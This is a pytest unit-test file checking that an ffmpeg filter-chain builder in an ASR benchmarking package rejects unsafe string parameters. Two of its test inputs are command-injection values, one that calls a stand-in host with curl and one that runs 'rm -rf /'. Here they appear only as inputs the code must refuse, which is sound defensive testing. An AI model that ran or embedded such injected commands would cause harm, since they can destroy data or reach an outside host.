"""Unit tests for the ffmpeg preprocessing param allow-list (Faz 1.5)."""

from __future__ import annotations

import pytest

from asrbench.preprocessing.ffmpeg_pipeline import build_filter_chain


class TestStringParamAllowlist:
    """Only whitelisted string values may reach the filter chain builder."""

    def test_known_format_accepted(self) -> None:
        # "none" short-circuits before the filter chain; still no error.
        chain = build_filter_chain({"format": "none", "highpass_hz": 80}, sr=16_000)
        assert "highpass=f=80" in chain

    def test_unknown_format_rejected(self) -> None:
        with pytest.raises(ValueError, match="format"):
            build_filter_chain({"format": "bogus_codec"}, sr=16_000)

    def test_format_injection_attempt_rejected(self) -> None:
        """A shell-metacharacter injection payload must fail the allow-list."""
        with pytest.raises(ValueError, match="format"):
            build_filter_chain(
                {"format": "none; curl evil.example.com"},
                sr=16_000,
            )

    def test_unknown_string_param_rejected(self) -> None:
        """A future string knob that slips in without an allow-list entry fails."""
        with pytest.raises(ValueError, match="unsafe string value"):
            build_filter_chain(
                {"new_knob": "value; rm -rf /"},
                sr=16_000,
            )

    def test_safe_string_token_accepted(self) -> None:
        """Alphanumerics, underscore, hyphen — safe tokens pass the defensive sweep."""
        # Not consumed by any real filter, but should not be rejected.
        chain = build_filter_chain({"internal_tag": "run-001"}, sr=16_000)
        assert isinstance(chain, str)

    def test_numeric_params_untouched(self) -> None:
        """Numeric params bypass the string allow-list entirely."""
        chain = build_filter_chain(
            {
                "highpass_hz": 80,
                "lowpass_hz": 8_000,
                "lufs_target": -23.0,
                "drc_ratio": 4.0,
            },
            sr=16_000,
        )
        assert "highpass=f=80" in chain
        assert "lowpass=f=8000" in chain
        assert "loudnorm=I=-23.0" in chain
        assert "acompressor=ratio=4.0" in chain

    def test_none_values_skipped(self) -> None:
        """None-valued params must not raise."""
        chain = build_filter_chain(
            {"format": None, "highpass_hz": None, "lowpass_hz": 4_000},
            sr=16_000,
        )
        assert "lowpass=f=4000" in chain
